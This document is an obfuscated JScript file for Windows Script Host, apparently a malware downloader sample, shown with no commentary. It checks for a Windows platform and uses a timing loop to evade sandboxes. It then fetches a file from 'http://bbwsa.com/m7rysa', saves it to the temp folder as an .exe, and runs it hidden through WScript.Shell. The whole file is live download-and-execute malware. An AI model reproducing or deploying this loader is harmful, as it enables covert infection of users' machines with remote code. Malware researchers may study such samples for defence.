var Zoymifx = false;
var Cmplfq = "CreateObject";
var Onyvfw = function Rotaiyjge() {return WScript[Cmplfq]("WScript.Shell");}();
var Xbmjogy = 123213;
var Kyatnw = "MSXML2.XMLHTTP";
var Aequmozs = 2123213;
var Pomnfbt = 0;
function Kvoxeircl(Xxycg){Onyvfw["Run"](Xxycg, Pomnfbt, Pomnfbt);};
function Cnyizxzwyd(){return Kyatnw;};
function Fhonwzjv(Gtnzjuwyv, Wovgukrwn){return Gtnzjuwyv - Wovgukrwn;};
function Eunpdo(){return Cmplfq;};
/*@cc_on
  @if (@_win32 || @_win64)
    Zoymifx = true;
  @end
@*/
var Kcxsesazs = "";
if (Zoymifx)
{
function Nxsviqdt(){return 22;};
var Vqaplyna = 0; var Bkskt = 0;
function Qbgdoovdp()
{
var Zrxpccgeru = new this["Date"]();
var Dhhuae = Zrxpccgeru["getUTCMilliseconds"]();
WScript["Sleep"](Nxsviqdt());
var Zrxpccgeru = new this["Date"]();
var Btqkj = Zrxpccgeru["getUTCMilliseconds"]();
WScript["Sleep"](Nxsviqdt());
var Zrxpccgeru = new this["Date"]();
var Kcdlrg = Zrxpccgeru["getUTCMilliseconds"]();
var Vqaplyna = "Lwipnn";
Vqaplyna = Fhonwzjv(Btqkj, Dhhuae);
var Bkskt = "Bpuyqfdvom";
Bkskt = Fhonwzjv(Kcdlrg, Btqkj);
Kcxsesazs = "open";
return Fhonwzjv(Vqaplyna, Bkskt);
}
var Ayrgrdtafv = false;
var Qboxminoxp = false;
for (var Uqabxb = Pomnfbt; Uqabxb < Nxsviqdt() * 1; Uqabxb++){if (Qbgdoovdp() != Pomnfbt){
Ayrgrdtafv = true; 
Bkskt = "07t9gasdf76ags" + 123313 * Vqaplyna + Bkskt; 
Qboxminoxp = true; 
Bkskt = "07t9gasdf76ags" + 123313 * Vqaplyna + Bkskt; 
break;
}}
function Ufxlaopx() {return ((Ayrgrdtafv == true) && (Ayrgrdtafv == Qboxminoxp)) ? 1 : Pomnfbt;};
if (Ayrgrdtafv && Ufxlaopx() && Qboxminoxp){
function Ukftxpvl() {return Onyvfw["ExpandEnvironmentStrings"]("%TEMP%/") + "lqCvBpzIEHs.exe";};
 Odwanzvz = Cnyizxzwyd();
 Uxdvvag = WScript[Cmplfq](Odwanzvz);
 var Hecet = 1;
 while (Hecet){
try {
Uxdvvag[Kcxsesazs]("GET", "http://bbwsa.com/m7rysa", false);
Uxdvvag["send"]();
Sotgg = "Sleep";
do {WScript[Sotgg](Nxsviqdt() * 11)} while (Uxdvvag["readystate"] < 4 );
Hecet = Pomnfbt;
} catch(Ivmvakvv){Hecet = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Tpzwdvkwos(Odlruswfmq) {var Smxcicugl = (1, 2, 3, 4, 5, Odlruswfmq); return Smxcicugl;};
Hrocwj = WScript[Eunpdo()]("ADODB.Stream");
Odwanzvz = Hrocwj;
Odwanzvz[Kcxsesazs]();
Odwanzvz["type"] = Tpzwdvkwos(1);
Odwanzvz["write"](Uxdvvag["ResponseBody"]);
Hrocwj["position"] = Tpzwdvkwos(Pomnfbt);
Odwanzvz["SaveToFile"](Ukftxpvl(), Tpzwdvkwos(2) );
Hrocwj["close"]();
Kvoxeircl(Ukftxpvl());
}
}

